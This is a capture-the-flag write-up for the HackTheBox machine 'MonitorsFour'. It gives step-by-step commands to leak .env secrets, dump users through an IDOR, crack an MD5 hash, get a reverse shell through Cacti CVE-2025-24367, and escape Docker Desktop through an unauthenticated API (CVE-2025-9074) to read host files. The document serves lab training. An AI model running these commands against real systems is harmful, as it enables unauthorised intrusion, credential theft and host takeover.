# MonitorsFour — HackTheBox Writeup

**Difficulty:** Medium  
**OS:** Windows (Docker Desktop + WSL2)  
**Tags:** `IDOR` `Hash Cracking` `Credential Reuse` `CVE-2025-24367` `Docker Escape` `CVE-2025-9074`  
**User Flag:** `8775782[redacted]c7c087081a`  
**Root Flag:** `f77a0c[redacted]4e435c226`

---

## Attack Chain Overview

```
.env exposure → IDOR (token=0) → Hash crack → Cacti RCE (CVE-2025-24367) → Docker API escape (CVE-2025-9074) → Root
```

---

## Step 1 — Setup: Add Hosts

```bash
echo "10.10.11.98 monitorsfour.htb cacti.monitorsfour.htb" | sudo tee -a /etc/hosts
```

**Why:** The web server uses virtual hosting (name-based routing). Without this entry, your browser/tools can't resolve the hostname and will get no response or the wrong page.

---

## Step 2 — Port Scan

```bash
nmap -sC -sV -p- 10.10.11.98 -oN nmap_full.txt
```

**Results:**
| Port | Service | Notes |
|------|---------|-------|
| 80 | nginx (PHP) | Main web app |
| 5985 | WinRM | Windows Remote Management |

**Why:** Always scan all ports (`-p-`). Port 5985 tells us the host OS is Windows even though we'll land in a Linux container — important context for privilege escalation later.

---

## Step 3 — Find the .env File

```bash
curl http://monitorsfour.htb/.env
```

**Result:**
```
DB_HOST=mariadb
DB_PORT=3306
DB_NAME=monitorsfour_db
DB_USER=monitorsdbuser
DB_PASS=f37p2j8f4t0r
```

**Why:** `.env` files store app configuration and secrets. Developers often forget to block public access to them. Always check for `.env`, `.git`, `config.php`, `backup.sql` etc. during recon.

---

## Step 4 — Subdomain Discovery

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u http://monitorsfour.htb \
     -H "Host: FUZZ.monitorsfour.htb" -ac
```

**Result:** `cacti.monitorsfour.htb`

**Why:** The main site may be locked down but subdomains often host internal tools (admin panels, monitoring systems) with weaker security. Always enumerate subdomains.

---

## Step 5 — IDOR via token=0 (User Dump)

```bash
# First, find the token parameter
ffuf -u "http://monitorsfour.htb/user?FUZZ=test123" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -t 30 -fr "Missing token parameter" -fs 0

# Then dump all users
curl -s "http://monitorsfour.htb/user?token=0"
```

**Why this works:** The backend code checks `if token:` instead of `if token is not None:`. In many languages `0` is "falsy", so the token validation is skipped entirely and all user records are returned. This is a classic **IDOR** (Insecure Direct Object Reference) combined with a type juggling bug.

**Result:** Full JSON dump including MD5 password hashes:
```json
{"username":"admin","password":"56b32eb43e6f15395f6c46c1c9e1cd36","name":"Marcus Higgins"}
```

---

## Step 6 — Crack the Hash

```bash
echo "admin:56b32eb43e6f15395f6c46c1c9e1cd36" > hashes.txt
john --format=raw-md5 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Result:** `wonderful1`

**Why:** MD5 is a broken hashing algorithm — it's fast to compute and has no salt here, making it trivially crackable with a dictionary attack. Always try john/hashcat against leaked hashes.

> **Note:** The hash belongs to `admin` but the Cacti username is `marcus` (from the name field "Marcus Higgins"). Always try variant usernames when credential reuse is suspected.

---

## Step 7 — Login to Cacti

- URL: `http://cacti.monitorsfour.htb/cacti/`
- Username: `marcus`
- Password: `wonderful1`
- Version confirmed: **Cacti 1.2.28**

**Why this works:** Credential reuse — the same password was set on both the main app and Cacti. Always try discovered credentials on every login form you find.

---

## Step 8 — Exploit CVE-2025-24367 (Cacti RCE)

**Vulnerability:** Cacti ≤ 1.2.28 allows command injection in the Graph Template `right_axis_label` field. The value is passed unsanitized to `rrdtool`, which interprets newlines as separate commands.

**How it works:**
1. Attacker injects newlines into `right_axis_label`
2. Cacti passes this to rrdtool as part of a graph rendering command
3. rrdtool interprets each line as a separate command
4. One command creates an RRD file, another writes a PHP webshell
5. The PHP file ends up in the Cacti web root
6. Visiting the PHP file executes the reverse shell

```bash
# Setup
git clone https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC.git
cd CVE-2025-24367-Cacti-PoC
python3 -m venv venv && source venv/bin/activate
pip install requests beautifulsoup4

# Terminal 1 — listener
nc -lvnp 1337

# Terminal 2 — exploit (sudo needed: script binds port 80 to serve payload)
sudo venv/bin/python3 exploit.py \
  -url http://cacti.monitorsfour.htb \
  -u marcus -p wonderful1 \
  -i <YOUR_TUN0_IP> -l 1337
```

**Why sudo:** The exploit spins up a temporary HTTP server on port 80 to deliver a bash reverse shell script to the target. Port 80 requires root privileges to bind.

**Expected output:**
```
[+] Cacti Instance Found!
[+] Serving HTTP on port 80
[+] Login Successful!
[+] Got graph ID: 226
[i] Created PHP filename: xxxxx.php
[+] Got payload: /bash
[i] Created PHP filename: xxxxx.php
[+] Hit timeout, looks good for shell, check your listener!
```

**Shell lands as:** `www-data` inside a Docker container

---

## Step 9 — User Flag

```bash
cat /home/marcus/user.txt
```

The file is world-readable (mode 644) so `www-data` can read it even without being the owner.

---

## Step 10 — Container Enumeration

```bash
hostname        # short container ID e.g. 821fbd6a43fa — confirms we're in Docker
ip addr         # container IP: 172.18.0.x
ip route        # gateway: 172.18.0.1
uname -a        # kernel shows: microsoft-standard-WSL2
```

**Why:** Always understand where you landed. The WSL2 kernel confirms we're inside Docker Desktop on Windows — this changes the escape strategy.

---

## Step 11 — Find the Docker API (CVE-2025-9074)

**Vulnerability:** Docker Desktop exposes its Engine API on `192.168.65.7:2375` to internal containers without authentication. This is by design in Docker Desktop's internal networking model but is exploitable.

```bash
# Scan the Docker Desktop internal subnet for the API
for i in $(seq 1 254); do
  (curl -s --connect-timeout 1 http://192.168.65.$i:2375/version 2>/dev/null \
  | grep -q "ApiVersion" && echo "192.168.65.$i OPEN") &
done; wait
```

**Result:** `192.168.65.7 OPEN`

**Why 192.168.65.0/24:** Docker Desktop on Windows uses this subnet for its internal WSL2 networking. `host.docker.internal` resolves to `.254` but the API is on `.7`.

```bash
# Confirm API access
curl http://192.168.65.7:2375/version

# List available images
curl -s http://192.168.65.7:2375/images/json | grep -o '"RepoTags":\[[^]]*\]'
```

**Available images:**
- `docker_setup-nginx-php:latest`
- `docker_setup-mariadb:latest`
- `alpine:latest`  ← use this

---

## Step 12 — Docker Escape → Root Flag

**Why this works:** The Docker API has no authentication. We can create a new privileged container that mounts the Windows host filesystem (`C:\` drive) at `/mnt/host_root`. From inside that container we can read any file on the host — including `root.txt` on the Administrator's Desktop.

The path `/mnt/host/c` is how Docker Desktop on Windows exposes the host `C:\` drive to containers via WSL2.

```bash
# Create container with host C:\ mounted
curl -X POST http://192.168.65.7:2375/containers/create \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine:latest",
    "Cmd": ["/bin/sh", "-c", "cat /mnt/host_root/Users/Administrator/Desktop/root.txt"],
    "HostConfig": {"Binds": ["/mnt/host/c:/mnt/host_root"]},
    "Tty": true
  }' \
  -o /tmp/c.json

# Extract container ID and start it
cid=$(grep -o '"Id":"[^"]*"' /tmp/c.json | cut -d'"' -f4 | cut -c1-12)
curl -X POST http://192.168.65.7:2375/containers/$cid/start

# Read root flag from container logs
sleep 2
curl "http://192.168.65.7:2375/containers/$cid/logs?stdout=true"
```

**Root flag returned directly in the curl response — no reverse shell needed.**

---

## Key Vulnerabilities Summary

| # | Vulnerability | Impact |
|---|--------------|--------|
| 1 | Exposed `.env` file | DB credentials leaked |
| 2 | IDOR + falsy token=0 | Full user database dump |
| 3 | MD5 without salt | Password cracked instantly |
| 4 | Credential reuse | Cacti admin access |
| 5 | CVE-2025-24367 (Cacti ≤ 1.2.28) | RCE via rrdtool injection |
| 6 | CVE-2025-9074 (Docker Desktop) | Unauthenticated Docker API → host filesystem access |

---

## Lessons Learned

- **Always check `.env`, `.git`, `backup` files** — developers forget to block them
- **Test falsy values** (`0`, `-1`, `null`, `""`) on every token/ID parameter
- **Credential reuse is extremely common** — try every set of creds on every login form
- **Understand your execution context** — container vs host changes everything
- **Docker Desktop has a unique network model** — `192.168.65.0/24` is the internal subnet
- **Unauthenticated Docker API = full host compromise** — always scan internal subnets from inside containers
- **Machine state matters for exploits** — stale RRD files from failed attempts can block re-exploitation; reset the machine for a clean run

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning |
| `ffuf` | Subdomain + parameter fuzzing |
| `curl` | API interaction |
| `john` | Hash cracking |
| `nc` | Reverse shell listener |
| Python PoC | CVE-2025-24367 exploit |

---

## References

- [CVE-2025-24367 PoC](https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC)
- [CVE-2025-9074 — Docker Desktop API exposure](https://nvd.nist.gov/vuln/detail/CVE-2025-9074)
- [Cacti Official Site](https://www.cacti.net/)
